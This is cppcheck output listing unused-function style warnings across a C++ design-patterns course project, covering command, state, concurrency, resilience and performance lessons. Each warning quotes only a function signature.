D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_cpp23_comparison.cpp:44:14: style: The function 'executeAsync' is never used. [unusedFunction]
        void executeAsync() {
             ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:64:10: style: The function 'isOn' is never used. [unusedFunction]
    bool isOn() const { return isOn_; }
         ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:233:12: style: The function 'getRedoStackSize' is never used. [unusedFunction]
    size_t getRedoStackSize() const {
           ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\command_pattern.cpp:276:12: style: The function 'getCommandCount' is never used. [unusedFunction]
    size_t getCommandCount() const {
           ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\secure_command_alternatives.cpp:231:17: style: The function 'getAuditLog' is never used. [unusedFunction]
    std::string getAuditLog() const {
                ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\undo_redo.cpp:210:10: style: The function 'clearHistory' is never used. [unusedFunction]
    void clearHistory() {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\undo_redo.cpp:420:24: style: The function 'getContent' is never used. [unusedFunction]
    const std::string& getContent() const { return content_; }
                       ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\undo_redo.cpp:421:9: style: The function 'getFontSize' is never used. [unusedFunction]
    int getFontSize() const { return fontSize_; }
        ^
D:\Work\Patterns\05-behavioral\lesson_5_3_command\undo_redo.cpp:422:24: style: The function 'getFontFamily' is never used. [unusedFunction]
    const std::string& getFontFamily() const { return fontFamily_; }
                       ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\exploits\state_exploits.cpp:269:10: style: The function 'elevateToAdmin' is never used. [unusedFunction]
    void elevateToAdmin(const std::string& admin_code) {
         ^
D:\Work\Patterns\05-behavioral\lesson_5_4_state\state_vulnerabilities.cpp:233:12: style: The function 'getAmount' is never used. [unusedFunction]
    double getAmount() const { return amount_; }
           ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:115:10: style: The function 'writeFile' is never used. [unusedFunction]
    void writeFile(const std::string& filename, const std::string& content) {
         ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:143:31: style: The function 'borrowResource' is never used. [unusedFunction]
    std::unique_ptr<Resource> borrowResource(const std::string& name) {
                              ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:356:12: style: The function 'getInUseCount' is never used. [unusedFunction]
    size_t getInUseCount() const {
           ^
D:\Work\Patterns\06-modern-cpp\lesson_6_1_smart_pointers\memory_management.cpp:532:14: style: The function 'addChild' is never used. [unusedFunction]
        void addChild(std::shared_ptr<Node> child) {
             ^
D:\Work\Patterns\06-modern-cpp\lesson_6_2_move_semantics\move_semantics_cpp23_comparison.cpp:63:52: style: The function 'as2D' is never used. [unusedFunction]
        std::mdspan<int, std::dextents<size_t, 2>> as2D(size_t rows, size_t cols) {
                                                   ^
D:\Work\Patterns\06-modern-cpp\lesson_6_3_crtp\crtp_cpp23_comparison.cpp:47:14: style: The function 'interfaceUnsafe' is never used. [unusedFunction]
        void interfaceUnsafe() {
             ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\modern_producer_consumer.cpp:155:10: style: The function 'isFinished' is never used. [unusedFunction]
    bool isFinished() const { return finished_.load(); }
         ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\modern_producer_consumer.cpp:156:12: style: The function 'getTotalProduced' is never used. [unusedFunction]
    size_t getTotalProduced() const { return totalProduced_.load(); }
           ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\modern_producer_consumer.cpp:157:12: style: The function 'getTotalConsumed' is never used. [unusedFunction]
    size_t getTotalConsumed() const { return totalConsumed_.load(); }
           ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\modern_producer_consumer.cpp:158:12: style: The function 'getTotalBlocked' is never used. [unusedFunction]
    size_t getTotalBlocked() const { return totalBlocked_.load(); }
           ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_comparison.cpp:42:14: style: The function 'runProducer' is never used. [unusedFunction]
        void runProducer() {
             ^
D:\Work\Patterns\07-concurrency\lesson_7_1_producer_consumer\producer_consumer_cpp23_full_comparison.cpp:344:12: style: The function 'getTotalTimeouts' is never used. [unusedFunction]
    size_t getTotalTimeouts() const { return totalTimeouts_.load(); }
           ^
D:\Work\Patterns\07-concurrency\lesson_7_2_thread_pool\thread_pool_cpp23_comparison.cpp:322:43: style: The function 'getTasks' is never used. [unusedFunction]
    std::generator<std::function<void()>> getTasks() {
                                          ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_cpp23_comparison.cpp:85:33: style: The function 'getMessages' is never used. [unusedFunction]
        std::generator<Message> getMessages() {
                                ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:151:12: style: The function 'getMessagesReceived' is never used. [unusedFunction]
    size_t getMessagesReceived() const { return messagesReceived_.load(); }
           ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\actor_model_pattern.cpp:531:12: style: The function 'getActorCount' is never used. [unusedFunction]
    size_t getActorCount() const {
           ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\message_passing.cpp:207:10: style: The function 'startPingPong' is never used. [unusedFunction]
    void startPingPong() {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_3_actor_model\message_passing.cpp:426:10: style: The function 'unregisterActor' is never used. [unusedFunction]
    void unregisterActor(const std::string& name) {
         ^
D:\Work\Patterns\07-concurrency\lesson_7_4_reactor\reactor_cpp23_comparison.cpp:588:9: style: The function 'getEventCount' is never used. [unusedFunction]
    int getEventCount() const {
        ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_cpp23_comparison.cpp:346:20: style: The function 'getRecentErrors' is never used. [unusedFunction]
    std::vector<E> getRecentErrors() const {
                   ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:116:10: style: The function 'isClosed' is never used. [unusedFunction]
    bool isClosed() const {
         ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:124:10: style: The function 'isHalfOpen' is never used. [unusedFunction]
    bool isHalfOpen() const {
         ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:128:17: style: The function 'getStateString' is never used. [unusedFunction]
    std::string getStateString() const {
                ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:133:10: style: The function 'forceState' is never used. [unusedFunction]
    void forceState(CircuitState newState) {
         ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:379:10: style: The function 'setServiceFailureRate' is never used. [unusedFunction]
    void setServiceFailureRate(const std::string& serviceName, double rate) {
         ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\circuit_breaker_pattern.cpp:393:10: style: The function 'resetAllServices' is never used. [unusedFunction]
    void resetAllServices() {
         ^
D:\Work\Patterns\08-high-load\lesson_8_2_circuit_breaker\resilient_client.cpp:289:10: style: The function 'setHealthy' is never used. [unusedFunction]
    void setHealthy(bool healthy) {
         ^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\bulkhead_pattern.cpp:149:12: style: The function 'getActiveThreads' is never used. [unusedFunction]
    size_t getActiveThreads() const {
           ^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\resource_isolation.cpp:159:12: style: The function 'getMemoryUsed' is never used. [unusedFunction]
    size_t getMemoryUsed() const { return memory_used_.load(); }
           ^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\resource_isolation.cpp:160:12: style: The function 'getThreadsActive' is never used. [unusedFunction]
    size_t getThreadsActive() const { return threads_active_.load(); }
           ^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\resource_isolation.cpp:161:12: style: The function 'getConnectionsActive' is never used. [unusedFunction]
    size_t getConnectionsActive() const { return connections_active_.load(); }
           ^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\resource_isolation.cpp:162:12: style: The function 'getFileDescriptorsUsed' is never used. [unusedFunction]
    size_t getFileDescriptorsUsed() const { return file_descriptors_used_.load(); }
           ^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\resource_isolation.cpp:165:12: style: The function 'getMemoryPeak' is never used. [unusedFunction]
    size_t getMemoryPeak() const { return memory_peak_.load(); }
           ^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\resource_isolation.cpp:166:12: style: The function 'getThreadsPeak' is never used. [unusedFunction]
    size_t getThreadsPeak() const { return threads_peak_.load(); }
           ^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\resource_isolation.cpp:167:12: style: The function 'getConnectionsPeak' is never used. [unusedFunction]
    size_t getConnectionsPeak() const { return connections_peak_.load(); }
           ^
D:\Work\Patterns\08-high-load\lesson_8_3_bulkhead\resource_isolation.cpp:343:43: style: The function 'getTracker' is never used. [unusedFunction]
    std::shared_ptr<ResourceUsageTracker> getTracker() {
                                          ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\distributed_transactions.cpp:285:38: style: The function 'getTransaction' is never used. [unusedFunction]
    std::shared_ptr<SagaTransaction> getTransaction(const std::string& id) {
                                     ^
D:\Work\Patterns\08-high-load\lesson_8_4_saga\saga_cpp23_comparison.cpp:74:47: style: The function 'getCompensations' is never used. [unusedFunction]
        std::generator<std::function<void()>> getCompensations() {
                                              ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:195:12: style: The function 'total' is never used. [unusedFunction]
    size_t total() const {
           ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:199:12: style: The function 'borrowed' is never used. [unusedFunction]
    size_t borrowed() const {
           ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:208:10: style: The function 'isFull' is never used. [unusedFunction]
    bool isFull() const {
         ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:321:17: style: The function 'getConnectionInfo' is never used. [unusedFunction]
    std::string getConnectionInfo() const {
                ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:391:10: style: The function 'isActive' is never used. [unusedFunction]
    bool isActive() const { return active_; }
         ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\object_pool_pattern.cpp:394:17: style: The function 'getInfo' is never used. [unusedFunction]
    std::string getInfo() const {
                ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:266:10: style: The function 'isInUse' is never used. [unusedFunction]
    bool isInUse() const {
         ^
D:\Work\Patterns\09-performance\lesson_9_1_object_pool\resource_pool.cpp:270:10: style: The function 'setInUse' is never used. [unusedFunction]
    void setInUse(bool use) {
         ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_pattern.cpp:54:24: style: The function 'getFont' is never used. [unusedFunction]
    const std::string& getFont() const { return font_; }
                       ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_pattern.cpp:83:24: style: The function 'getTreeType' is never used. [unusedFunction]
    const std::string& getTreeType() const { return tree_type_; }
                       ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_pattern.cpp:84:24: style: The function 'getTexture' is never used. [unusedFunction]
    const std::string& getTexture() const { return texture_; }
                       ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_pattern.cpp:86:24: style: The function 'getSeason' is never used. [unusedFunction]
    const std::string& getSeason() const { return season_; }
                       ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_pattern.cpp:114:24: style: The function 'getButtonType' is never used. [unusedFunction]
    const std::string& getButtonType() const { return button_type_; }
                       ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_pattern.cpp:118:24: style: The function 'getColorScheme' is never used. [unusedFunction]
    const std::string& getColorScheme() const { return color_scheme_; }
                       ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\flyweight_pattern.cpp:195:24: style: The function 'getAdditionalData' is never used. [unusedFunction]
    const std::string& getAdditionalData() const { return additional_data_; }
                       ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\memory_optimization.cpp:60:12: style: The function 'getCurrentBytes' is never used. [unusedFunction]
    size_t getCurrentBytes() const {
           ^
D:\Work\Patterns\09-performance\lesson_9_2_flyweight\memory_optimization.cpp:270:12: style: The function 'getCharacterCount' is never used. [unusedFunction]
    size_t getCharacterCount() const {
           ^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\batch_processing.cpp:61:10: style: The function 'getCreatedTime' is never used. [unusedFunction]
    auto getCreatedTime() const { return created_at_; }
         ^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\batch_processing.cpp:101:24: style: The function 'getTable' is never used. [unusedFunction]
    const std::string& getTable() const { return table_; }
                       ^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\batch_processing.cpp:102:9: style: The function 'getRecordId' is never used. [unusedFunction]
    int getRecordId() const { return record_id_; }
        ^
D:\Work\Patterns\09-performance\lesson_9_3_command_queue\command_queue_pattern.cpp:68:9: style: The function 'getSpriteId' is never used. [unusedFunction]
    int getSpriteId() const { return sprite_id_; }
        ^
D:\Work\Patterns\common\utils.cpp:69:29: style: The function 'createInt' is never used. [unusedFunction]
std::unique_ptr<int> Utils::createInt(int value) {
                            ^
D:\Work\Patterns\common\utils.h:71:17: style: The function 'printTypeInfo' is never used. [unusedFunction]
    static void printTypeInfo(const T& value) {
                ^
nofile:0:0: information: Active checkers: 183/966 (use --checkers-report=<filename> to see details) [checkersReport]

